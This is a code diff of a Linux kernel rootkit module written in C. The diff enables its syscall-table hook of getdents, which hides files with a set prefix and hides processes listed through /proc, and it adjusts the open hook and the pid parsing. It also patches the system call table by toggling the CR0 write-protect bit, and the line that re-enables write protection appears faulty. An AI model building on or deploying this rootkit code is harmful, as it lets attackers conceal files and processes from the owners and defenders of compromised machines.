@@ -233,13 +233,13 @@ out:
 pid_t get_pid_from_str(const char *str)
 {
     int err;
-    pid_t ret;
+    long res;
     
-    err = kstrtol(str, 10, (long *) &ret);
+    err = kstrtol(str, 10,  &res);
     if (err)
-        ret = -1;
+        res = -1;
 
-    return ret;
+    return (pid_t) res;
 }
 
 /*
@@ -252,17 +252,6 @@ int filename_matches_pattern(const char *filename)
     return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
 }
 
-asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
-{
-    int ret;
-
-    //mutex_lock(&(buf_struct.lock));
-    ret = original_getdents(fd, dirp, count);
-    //mutex_unlock(&(buf_struct.lock));
-
-    return ret;
-}
-/*
 asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
     mm_segment_t old_fs;
@@ -280,6 +269,7 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
     mutex_lock(&(buf_struct.lock));
 
     old_fs = get_fs();
+    set_fs(KERNEL_DS);
     ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
     set_fs(old_fs);
 
@@ -313,7 +303,7 @@ out:
     mutex_unlock(&(buf_struct.lock));
     return ret;
 }
-*/
+
 
 
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
@@ -326,7 +316,7 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
         /* opened "/proc";
            store the process's pid and opened fd
            we'll use these in getdents to hide processes */
-
+        printk("/proc opened\n");
         proc_open_pid = current->pid;
         proc_open_fd = fd;
     }
@@ -401,6 +391,7 @@ void deinit_buf_struct(void)
 
 int rootkit_init(void)
 {
+    pid_t pid;
     printk("Rootkit loaded\n");
     proc_open_fd = -1;
     proc_open_pid = -1;
@@ -444,8 +435,8 @@ int rootkit_init(void)
     syscall_table[__NR_getdents] = (void *) my_getdents;
     
     // enable write protected
-    write_cr0(read_cr0() & 0x10000);
-    
+    write_cr0(read_cr0() & 0x10000); 
+       
     out:
     return 0;
 }
